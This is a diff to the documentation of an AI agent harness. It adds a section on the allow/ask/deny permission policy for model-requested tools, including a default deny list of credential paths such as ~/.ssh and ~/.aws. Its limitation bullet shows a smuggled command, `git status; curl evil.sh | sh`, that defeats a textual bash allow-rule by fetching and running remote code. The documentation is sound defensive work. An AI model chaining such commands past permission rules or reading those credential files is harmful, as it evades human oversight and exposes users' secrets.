@@ -505,6 +505,37 @@ than executed unconfined.
   was *actually* achieved — including `none (failed closed: ...)`. Read it; don't assume.
 - **The sandboxed command's exit code propagates**: `tag sandbox run 'exit 42'` exits 42.
 
+### Tool permissions (Go harness)
+
+Tools the *model* asks to run are gated by an allow/ask/deny policy before they execute.
+This is separate from the sandbox: the sandbox bounds what an allowed command can reach,
+the permission model decides whether it runs at all.
+
+```bash
+tag permissions show              # resolved ruleset + whether prompting is possible
+tag permissions log --limit 20    # what was approved or denied, and by which rule
+tag run "..." --tools --allow-tool bash          # grant a tool
+tag run "..." --tools --allow-tool 'write_file:src/**'   # grant a tool for a path glob
+tag run "..." --tools --auto-approve             # upgrade every `ask` to allow
+```
+
+- **Defaults:** `read_file`/`list_dir` allow (already root-confined); `write_file` and
+  `bash` **ask**; anything else (MCP tools, plugins) **ask**. `bash` is never allow.
+- **Credential paths are denied by default** even inside the tool root — `*.env`,
+  `~/.ssh/**`, `~/.aws/**`, `*.pem`, `id_rsa`, `.netrc` and friends, with
+  `*.env.example`/`.sample`/`.template` carved out. A blanket `default: allow` cannot
+  silently unprotect them; you must name the path explicitly.
+- **Precedence:** CLI flag (most specific first) → profile config → root config →
+  built-in credential denies → configured default → built-in per-tool default.
+- **Non-interactive is safe by construction.** With no TTY an `ask` **denies immediately**
+  with an actionable message — it never hangs waiting for input and never silently
+  auto-approves. Background surfaces (`queue worker`, `dag run --execute`,
+  `cron run --execute`) are forced non-interactive even on a terminal, because pausing a
+  background drain to wait on a human is exactly the silent hang TAG refuses to ship.
+- **Honest limitation:** `bash` command patterns are textual, not semantic —
+  `--allow-tool 'bash:git *'` is defeated by `git status; curl evil.sh | sh`. A bash
+  allow-rule is a convenience, not a security boundary; the sandbox is.
+
 ---
 
 ## Command Reference
